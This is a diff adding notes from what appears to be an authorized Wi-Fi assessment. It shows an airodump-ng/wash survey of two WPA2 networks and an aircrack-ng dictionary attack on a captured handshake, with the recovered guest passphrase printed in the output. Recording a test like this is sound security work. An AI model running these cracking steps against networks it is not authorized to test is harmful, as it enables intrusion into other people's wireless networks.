@@ -1,0 +1,16 @@
+# Authorized wireless assessment - site survey (airodump-ng + wash), then an
+# offline crack of a captured 4-way handshake. In-scope SSID only.
+
+ BSSID              PWR  ENC   CIPHER AUTH ESSID            WPS
+ AA:BB:CC:11:22:33  -42  WPA2  CCMP   PSK  CORP-GUEST       WPS: enabled (v2.0, not locked)
+ AA:BB:CC:44:55:66  -55  WPA2  CCMP   PSK  CORP-INTERNAL    WPS: disabled
+
+# Captured the 4-way handshake for CORP-GUEST (client reconnect), then ran an
+# offline dictionary attack against it:
+
+$ aircrack-ng -w rockyou.txt -b AA:BB:CC:11:22:33 corp-guest.cap
+                          Aircrack-ng 1.7
+      [00:00:11] 148213/14344391 keys tested (13455.9 k/s)
+      KEY FOUND! [ Summer2021 ]
+
+# CORP-INTERNAL: Passphrase not in dictionary (36-char random PSK) - not recovered.
